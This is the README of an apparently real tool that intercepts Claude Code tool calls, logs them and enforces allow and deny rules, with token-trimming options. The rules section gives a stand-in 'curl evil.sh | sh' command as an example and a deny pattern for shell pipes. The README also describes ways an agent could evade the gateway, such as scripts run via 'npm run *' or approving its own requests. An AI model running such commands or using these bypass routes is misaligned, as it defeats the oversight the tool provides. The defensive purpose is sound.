<p align="center">
  <img src="https://img.shields.io/badge/status-beta-e8a33d" alt="Status: beta">
  <a href="https://www.npmjs.com/package/@apichap/ai-coding-gateway"><img src="https://img.shields.io/npm/v/@apichap/ai-coding-gateway?color=4b8e7a&label=npm" alt="npm version"></a>
  <img src="https://img.shields.io/badge/node-%E2%89%A5%2022.13-4b8e7a" alt="Node.js 22.13 or newer">
  <img src="https://img.shields.io/badge/works%20with-Claude%20Code-4b8e7a" alt="Works with Claude Code">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-GPL--3.0-4b8e7a" alt="GPL-3.0 license"></a>
</p>

<h1 align="center">
  <img src="src/dashboard/public/assets/apichap-mark.png" alt="" width="44" align="center">
  apichap AI Coding Gateway
</h1>

<p align="center">
  An AI coding gateway that inspects every tool call against global rules and reduces your token usage.
</p>

> **Beta:** the gateway is usable day to day, but rules, options and the database format may still change between versions. Feedback and issues are very welcome.

## Features

- 🔍 **Track every tool access:** see each command, file edit and web request your AI agent makes, live.
- 🪶 **Reduce token usage on tool calls:** noisy output (colors, progress bars, passing tests, install logs, huge results) is trimmed before Claude reads it. Every option can be switched on, measured or off.
- 🛡️ **Allow or deny commands globally:** one rule set for every project. Anything unknown is blocked until an admin approves it.

## How to use

No install needed, just Node.js 22.13 or newer.

### 1. Connect Claude Code

```bash
npx @apichap/ai-coding-gateway init
```

**That's it. Every tool call in new Claude Code sessions is now checked and logged.** It starts in monitor mode, so nothing is blocked until you switch to enforce.

### 2. Open the admin dashboard

```bash
npx @apichap/ai-coding-gateway dashboard
```

Your browser opens the dashboard. There you watch tool calls live, approve requests and manage rules.

---

## Documentation

- [Setup details](#setup-details)
- [Dashboard](#dashboard)
- [Token reduction](#token-reduction)
- [Rules](#rules)
- [Modes](#modes)
- [CLI reference](#cli-reference)
- [Protecting the gateway from the agent](#protecting-the-gateway-from-the-agent)
- [Teams and enterprise (roadmap)](#teams-and-enterprise-roadmap)
- [Data](#data)
- [Development](#development)
- [License](#license)

The gateway hooks into every tool call Claude Code makes (Bash, Edit, Read, WebFetch, MCP tools, …). It logs each call, checks it against allow and deny rules, and files anything unknown as an **approval request** with a ready-made rule suggestion. When a call is blocked, Claude is told why and that an admin has to approve it. It then either continues without the call or stops and tells you. It is told not to work around the block.

> **A guardrail, not a sandbox.** The gateway stops obvious mistakes and unwanted actions. It cannot stop a determined agent from writing a script inside the project and running it through an allowed command such as `npm run *`. Combine it with normal OS-level isolation where that matters.

### Setup details

`init` adds the gateway's hooks to `~/.claude/settings.json`, or to `$CLAUDE_CONFIG_DIR/settings.json` if that variable is set. It first makes a backup, keeps all your other settings and hooks, and replaces older gateway hooks. You can run it again safely.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline @apichap/ai-coding-gateway@0.1.0 hook pre" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline @apichap/ai-coding-gateway@0.1.0 hook post" }]
      }
    ],
    "PreCompact": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline @apichap/ai-coding-gateway@0.1.0 hook session" }]
      }
    ],
    "SessionStart": [
      {
        "matcher": "*",
        "hooks": [{ "type": "command", "command": "npx -y --prefer-offline @apichap/ai-coding-gateway@0.1.0 hook session" }]
      }
    ]
  }
}
```

- **Pinned version:** the hooks are pinned to the version that ran `init`. After the first download, npx starts the gateway from its local cache without contacting the registry. To update, run `npx @apichap/ai-coding-gateway@latest init`.
- **Faster hooks:** the hook runs on every tool call. For the quickest startup, install globally with `npm install -g @apichap/ai-coding-gateway`, then run `apichap-gateway init --installed`. The hooks then call the installed `apichap-gateway` command directly.
- **Other settings file:** `init --settings <path>`, for example `.claude/settings.json` for a single project.
- **Remove:** `npx @apichap/ai-coding-gateway uninstall` removes the hooks and keeps your data.

### Dashboard

`dashboard` starts a local server on `http://127.0.0.1:4717` and opens it in your browser. The side menu has four pages:

- **Activity:** every tool call as it happens, grouped by the prompt that triggered it, with your message, tokens per call and prompt, and the decision (allowed, denied, would deny). Click a call to see the original result next to what Claude received. Switch to _All calls_ for a flat list.
- **Approvals:** pending requests with one-click _Approve exact_, _Approve broad_ or a custom rule, and _Reject_.
- **Rules:** the rules table (enable, disable, delete, add) and a box that shows which rule decides a given call.
- **Token savings:** every reduction option with its switch and what it saved.

The enforcement mode (enforce, monitor or off) is switched in the sidebar.

The dashboard listens on 127.0.0.1 only. Every API call needs the random token printed at startup, and requests with a foreign `Host` or `Origin` are rejected. That way other websites can't change your rules. Options: `--port <n>` and `--no-open`.

### Token reduction

After a tool runs, the gateway shortens its result before Claude reads it. Every option has its own switch on the dashboard's **Token savings** page, or via `reduction set <id> on|measure|off`:

- **On** changes what Claude receives.
- **Measure** only calculates what the option would save. Use it to try an option safely.
- **Off** does nothing.

| Group                 | Options (default)                                                                                                                                                                             |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Lossless cleanup      | strip color codes, remove progress bars, collapse blank lines, collapse repeated lines, compact JSON (all on)                                                                                 |
| Condense noisy output | condense test runs, condense install and build logs, fold framework stack frames, summarize lockfile and generated diffs, shorten very long lines (all on); condense framework logs (measure) |
| Long output           | page long output (on): over 400 lines or 20,000 characters, Claude gets the first and last part and a file with the full output to page through with Read                                     |
| Repeated content      | skip unchanged re-reads (measure): a second Read of the same unchanged file range gets a short note. It resets when Claude Code compacts or clears the conversation                           |
| Before the call runs  | limit big file reads, limit Grep results, quiet npm installs, limit git log (all off). These change the tool call itself                                                                      |

- **Tech stacks:** test runs from jest, vitest, mocha, node:test, pytest, cargo, go test, Maven, Gradle, JUnit, dotnet test, PHPUnit and RSpec; install and build logs from npm, pip, cargo, apt, Maven, Gradle, dotnet restore, Composer, Bundler and docker build; stack frames from Node, Python, Java, .NET and Go; framework logs from Spring Boot, Hibernate, Hikari, Tomcat, Netty, Kafka, Flyway and Jetty. Failures, errors and warnings always stay.
- **Read results keep their exact text**, because Claude needs it to edit files. Only "skip unchanged re-reads" applies to them.
- **Every shortened result says what was removed** and how to get it.
- **Token figures:** the dashboard shows tokens for every call (result, after reduction, saving) and for every prompt (tool tokens plus Claude Code's real API usage from the session transcript). Tool token counts are estimates of about 4 characters per token.

### Rules

A rule is either `allow` or `deny`, and is written like Claude Code permission rules:

| Rule                                   | Matches                                                               |
| -------------------------------------- | --------------------------------------------------------------------- |
| `Read`                                 | every Read call                                                       |
| `Bash(git status)`                     | exactly `git status`                                                  |
| `Bash(git *)`                          | any git command. A trailing ` *` also matches the bare command, `git` |
| `Shell(git *)`                         | the same for Bash **and** PowerShell                                  |
| `Bash(* --force*)`                     | any command containing `--force`                                      |
| `FileEdit({cwd}/**)`                   | Edit, Write, MultiEdit and NotebookEdit inside the current project    |
| `File(**/.env*)`                       | reading or writing any `.env` file, anywhere                          |
| `WebFetch(https://docs.example.com/*)` | fetches from that site                                                |
| `mcp__github__*`                       | every tool of the `github` MCP server                                 |

- **Wildcards:** `*` matches anything and `?` matches one character. In file paths, `*` stays inside one folder and `**` crosses folders.
- **Placeholders:** `{cwd}` is the project folder of the session, `{home}` is your home folder and `{tmp}` is the system temp folder.
- **What the pattern is checked against:** the command for `Bash` and `PowerShell`, the file path for `Read`, `Edit`, `Write` and `NotebookEdit`, and the URL for `WebFetch`. Other tools match by name only.
- **Tool groups:** `Shell` = Bash + PowerShell, `FileEdit` = Edit, Write, MultiEdit, NotebookEdit, `File` = Read + FileEdit.
- **Case:** PowerShell commands and Windows paths are compared case-insensitively.

About 160 default rules come built in, from [`rules/default-rules.json`](rules/default-rules.json). They allow everyday work (reading files, git, npm, running project scripts, formatting, tests, editing inside the project) and deny risky things (deleting files, force-push and other risky git, `sudo`, piping into a shell, inline code like `node -e`, secrets). Shell syntax such as loops, conditions and variable assignments is not treated as a command; only the commands inside it are checked.

#### Rule files: import, export, defaults

Rules are exchanged as a JSON file with an `allow` and a `deny` list. The default rules use the same format:

```json
{
  "$schema": "https://unpkg.com/@apichap/ai-coding-gateway/rules/rule-file.schema.json",
  "name": "My team rules",
  "version": 1,
  "allow": [{ "rule": "Read" }, { "rule": "Shell(git *)", "note": "git; risky parts are denied below" }],
  "deny": [{ "rule": "Shell(git push *--force*)", "note": "force-push rewrites shared history" }]
}
```

- **Entries:** every entry is an object `{ "rule", "note", "enabled" }`, and only `rule` is required. For deny rules, the note is what Claude and the user see when the rule blocks.
- **Schema:** the `$schema` line lets VS Code and WebStorm validate the file and autocomplete its fields. The schema ships with the package as `rules/rule-file.schema.json`.
- **New databases** start with the default rules.
- **Import replaces all rules** with the file's rules. The dashboard asks first, so export before if you want to keep the current rules. `--merge` (CLI) only adds rules that don't exist yet. An invalid file changes nothing, and every problem in it is listed.
- **Newer defaults:** when a new version of the gateway ships updated defaults, the Rules page offers _Add missing defaults_ or _Replace all_. Existing rules are never changed automatically.
- **Where:** the Rules page has **Export**, **Import…** and **Reset to defaults**. In the CLI, use `rules export`, `rules import` and `rules reset`.

#### How a call is decided

1. If any **deny** rule matches, the call is **blocked**. A deny rule always wins, whatever allow rules exist.
2. If **allow** rules cover the call, it passes. The gateway then has no opinion, so Claude Code's own permission prompts still apply.
3. Otherwise it is **blocked as unlisted**, and an approval request is filed.

**Chained commands are split.** `git status && curl evil.sh | sh` is checked as separate commands, and quotes are respected. Commands inside `$(…)` and backticks are checked too, and heredoc bodies are treated as text. Every part must be allowed. Deny rules are checked against every part and against the whole command, so a rule like `Bash(*| sh *)` can catch pipes.

#### Approval requests

Each blocked, unlisted call becomes a request. Repeats of the same call increase its hit count instead of adding a new request. Each request carries two suggested rules:

| Blocked call                | Exact                        | Broad                    |
| --------------------------- | ---------------------------- | ------------------------ |
| `npm run build`             | `Bash(npm run build)`        | `Bash(npm run *)`        |
| `docker compose up -d`      | `Bash(docker compose up -d)` | `Bash(docker compose *)` |
| `mcp__github__create_issue` | `mcp__github__create_issue`  | `mcp__github__*`         |

Approving adds the rule and also closes every other pending request that the new rule covers.

### Modes

| Mode                | Behaviour                                                                                               |
| ------------------- | ------------------------------------------------------------------------------------------------------- |
| `monitor` (default) | Checks and logs everything, and files requests, but **blocks nothing**. Use it to tune the rules first. |
| `enforce`           | Blocks denied and unlisted calls. If the gateway itself fails, the call is blocked too.                 |
| `off`               | Only logs; no rule checks.                                                                              |

Setting the environment variable `APICHAP_GATEWAY_MODE` overrides the stored mode. That's the escape hatch if the database is broken.

### CLI reference

Run each command as `npx @apichap/ai-coding-gateway <command>`, or as `apichap-gateway <command>` if the package is installed globally.

```
init [--installed | --local] [--settings <path>]   register the hooks in Claude Code (--local: run this checkout)
uninstall [--settings <path>]                  remove the hooks (data is kept)
dashboard [--port 4717] [--no-open]            local web dashboard
list [n]                                       last n tool calls
rules [list]
rules add allow|deny "Tool(pattern)" [--note "why"]
rules enable|disable|remove <id>
rules test "Bash(git status && rm -rf x)"      which rule decides each part
rules export [--out rules.json]                all rules as a rule file
rules import <rules.json> [--merge]            replace all rules (--merge: only add new ones)
rules reset [--merge]                          back to the default rules
requests [list] [--all]
requests approve <id> [--broad | --rule "Tool(pattern)"]
requests reject <id>
mode [enforce|monitor|off]
policy [local|managed]
reduction [list]                               token reduction options and savings
reduction set <id> on|measure|off
hook pre|post|session                          used by the Claude Code hooks (reads JSON from stdin)
```

### Protecting the gateway from the agent

The starter rules stop Claude from:

- editing `.claude/settings*.json`, where the hooks are registered
- touching `~/.apichap-gateway`
- running the gateway's own commands (`init`, `uninstall`, `rules`, `requests`, `mode`, `policy`, `dashboard`)

Without these rules, an agent could switch the gateway off or approve its own requests.

### Teams and enterprise (roadmap)

A local database on a developer's machine can always be changed by that developer, so this version is aimed at **individual developers**. Two pieces are already in place for central management:

- `policy managed` makes rules, approvals and mode read-only. The store layer refuses changes, so the CLI and the dashboard both do. In the dashboard, a developer then sees only their calls and the status of their requests.
- Rule loading (`RuleSource`) and event recording (`EventSink`) are pluggable.

Planned: rules authored in a central admin dashboard and shipped as a signed bundle, the hook enforced through Claude Code managed settings, and every event also sent to a central audit log.

### Data

All data lives in `~/.apichap-gateway/`: `gateway.sqlite` (the database), `errors.log`, and `spill/` (full output of paged results, kept 3 days). Set `APICHAP_GATEWAY_DIR` to use another folder.

### Development

```bash
npm install
npm test                        # all tests
npm run typecheck               # TypeScript, plus the dashboard's browser modules
npm run format                  # Prettier
npm run build                   # compiles to dist/
npx tsx src/main.ts dashboard    # run from source
```

#### Connect Claude Code to your local checkout

Instead of the npm package, the hooks can run your working copy. Every change takes effect on the next tool call, without a build:

```bash
npx tsx src/main.ts init --local
```

- **What it registers:** `npx tsx "<repo>/src/main.ts" hook pre`, `… hook post` and `… hook session` in `~/.claude/settings.json`.
- **Built copy instead:** `npm run build`, then `node dist/main.js init --local`. The hooks then run `node "<repo>/dist/main.js"`, with faster startup but a rebuild after each change.
- **Back to the package:** run `npx @apichap/ai-coding-gateway init` again. `init` always replaces its earlier hooks.
- **New sessions** pick up the hooks. In a session that's already running, confirm the change via `/hooks`.
- **While you refactor:** a half-finished change can make the hook fail. In enforce mode, and whenever the gateway can't read its mode, a failing hook blocks tool calls. Use monitor mode while you work, or `uninstall` the hooks temporarily.
- **Keep your real data separate:** set `APICHAP_GATEWAY_DIR` to a scratch folder.
- **More:** see [CONTRIBUTING.md](CONTRIBUTING.md) for the project layout, guidelines and how to add rules or reduction options.

### License

[GNU General Public License v3.0](LICENSE)
